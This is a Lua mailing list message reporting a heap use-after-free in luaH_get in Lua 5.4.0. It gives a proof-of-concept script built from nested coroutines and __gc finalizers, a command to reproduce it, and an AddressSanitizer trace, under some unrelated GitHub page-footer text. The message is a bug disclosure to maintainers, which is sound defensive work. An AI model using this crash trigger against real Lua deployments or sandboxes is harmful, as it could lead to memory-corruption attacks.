* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
  ([Updated 02/2024](https://github.com/github/site-policy/pull/582))
* [Sitemap](/sitemap)
* [What is Git?](/git-guides)
* Manage cookies
* Do not share my personal information

* [GitHub on LinkedIn](https://www.linkedin.com/company/github)
* [Instagram
  GitHub on Instagram](https://www.instagram.com/github)
* [GitHub on YouTube](https://www.youtube.com/github)
* [GitHub on X](https://x.com/github)
* [TikTok
  GitHub on TikTok](https://www.tiktok.com/%40github)
* [Twitch
  GitHub on Twitch](https://www.twitch.tv/github)
* [GitHub’s organization on GitHub](https://github.com/github)

You can’t perform that action at this time.



=== Content from lua-users.org_941ddd87_20250119_122101.html ===


[[Date Prev](msg00070.html)][[Date Next](msg00072.html)][[Thread Prev](msg00066.html)][[Thread Next](msg00080.html)]
[[Date Index](index.html#00071)]
[[Thread Index](threads.html#00071)]

* **Subject**: **Heap overflow in luaH\_get**
* **From**: Yongheng Chen <changochen1@[...](/cgi-bin/echo.cgi?gmail.com)>
* **Date**: Mon, 6 Jul 2020 15:15:50 -0400

---

| Hi,    We found a heap overflow in lua. Here’s the details:    Version:  Lua 5.4.0, git hash c33b1728aeb7dfeec4013562660e07d32697aa6b    POC:  function test(do\_yield) error 'fail!' end coro = coroutine.wrap(  function() function errfunc() function errfunc(x)  pcall(function()  u = setmetatable({},  {  \_\_gc = function(a) B =  coroutine  .create(function() do assert(  setmetatable(  {},  {  \_\_gc  =  function(  )  function crash(  )  t[pairs( a )]=0  end  for i = 1, 5 do crash( )end  end  }))  if k then end end end)  coroutine.resume(B) end  }) require 'mod' end) 'fail' end coro =  coroutine.wrap(function() print(xpcall(test, errfunc)) end)  end print(xpcall(test, errfunc)) end) coro() coro()    How to reproduce:  ./lua poc.lua    Tested on Ubuntu16.    Stack dump:  =================================================================  ==14014==ERROR: AddressSanitizer: heap-use-after-free on address 0x6060000020d8 at pc 0x000000431a77 bp 0x7ffd9222c630 sp 0x7ffd9222c620  READ of size 8 at 0x6060000020d8 thread T0  #0 0x431a76 in luaH\_get (/home/yongheng/lua\_asan/lua+0x431a76)  #1 0x40a007 in lua\_rawget (/home/yongheng/lua\_asan/lua+0x40a007)  #2 0x44af37 in luaL\_getmetafield (/home/yongheng/lua\_asan/lua+0x44af37)  #3 0x45683f in luaB\_pairs (/home/yongheng/lua\_asan/lua+0x45683f)  #4 0x414de1 in luaD\_call (/home/yongheng/lua\_asan/lua+0x414de1)  #5 0x43d4cc in luaV\_execute (/home/yongheng/lua\_asan/lua+0x43d4cc)  #6 0x43d4cc in luaV\_execute (/home/yongheng/lua\_asan/lua+0x43d4cc)  #7 0x415194 in luaD\_callnoyield (/home/yongheng/lua\_asan/lua+0x415194)  #8 0x4127d0 in luaD\_rawrunprotected (/home/yongheng/lua\_asan/lua+0x4127d0)  #9 0x415d70 in luaD\_pcall (/home/yongheng/lua\_asan/lua+0x415d70)  #10 0x41ac34 in GCTM (/home/yongheng/lua\_asan/lua+0x41ac34)  #11 0x41e812 in finishgencycle (/home/yongheng/lua\_asan/lua+0x41e812)  #12 0x41ff00 in luaC\_step (/home/yongheng/lua\_asan/lua+0x41ff00)  #13 0x448dd6 in luaL\_error (/home/yongheng/lua\_asan/lua+0x448dd6)  #14 0x468a84 in findloader (/home/yongheng/lua\_asan/lua+0x468a84)  #15 0x468b97 in ll\_require (/home/yongheng/lua\_asan/lua+0x468b97)  #16 0x414de1 in luaD\_call (/home/yongheng/lua\_asan/lua+0x414de1)  #17 0x43d4cc in luaV\_execute (/home/yongheng/lua\_asan/lua+0x43d4cc)  #18 0x415194 in luaD\_callnoyield (/home/yongheng/lua\_asan/lua+0x415194)  #19 0x4127d0 in luaD\_rawrunprotected (/home/yongheng/lua\_asan/lua+0x4127d0)  #20 0x415d70 in luaD\_pcall (/home/yongheng/lua\_asan/lua+0x415d70)  #21 0x40bd47 in lua\_pcallk (/home/yongheng/lua\_asan/lua+0x40bd47)  #22 0x456d0f in luaB\_pcall (/home/yongheng/lua\_asan/lua+0x456d0f)  #23 0x414de1 in luaD\_call (/home/yongheng/lua\_asan/lua+0x414de1)  #24 0x43d4cc in luaV\_execute (/home/yongheng/lua\_asan/lua+0x43d4cc)  #25 0x415194 in luaD\_callnoyield (/home/yongheng/lua\_asan/lua+0x415194)  #26 0x4112ae in luaG\_errormsg (/home/yongheng/lua\_asan/lua+0x4112ae)  #27 0x411491 in luaG\_runerror (/home/yongheng/lua\_asan/lua+0x411491)  #28 0x411595 in luaG\_typeerror (/home/yongheng/lua\_asan/lua+0x411595)  #29 0x4138bc in luaD\_tryfuncTM (/home/yongheng/lua\_asan/lua+0x4138bc)  #30 0x41480d in luaD\_call (/home/yongheng/lua\_asan/lua+0x41480d)    Found by: Yongheng Chen and Rui Zhong    Best,  Yongheng      Sent from [Mail](https://go.microsoft.com/fwlink/?LinkId=550986) for Windows 10 |
| --- |

---

* **Follow-Ups**:
  + **[Re: Heap overflow in luaH\_get](msg00080.html),** *Sergey Zakharchenko*
  + **[Re: Heap overflow in luaH\_get](msg00105.html),** *Andrew Gierth*

* Prev by Date:
  **[Re: Stack overflow in luaO\_pushvfstring](msg00070.html)**
* Next by Date:
  **[Re: Stack overflow in luaO\_pushvfstring](msg00072.html)**
* Previous by thread:
  **[[BUG] C-undefined behavior exposed via io.popen mode parameter](msg00066.html)**
* Next by thread:
  **[Re: Heap overflow in luaH\_get](msg00080.html)**
* Index(es):
  + [**Date**](index.html#00071)
  + [**Thread**](threads.html#00071)


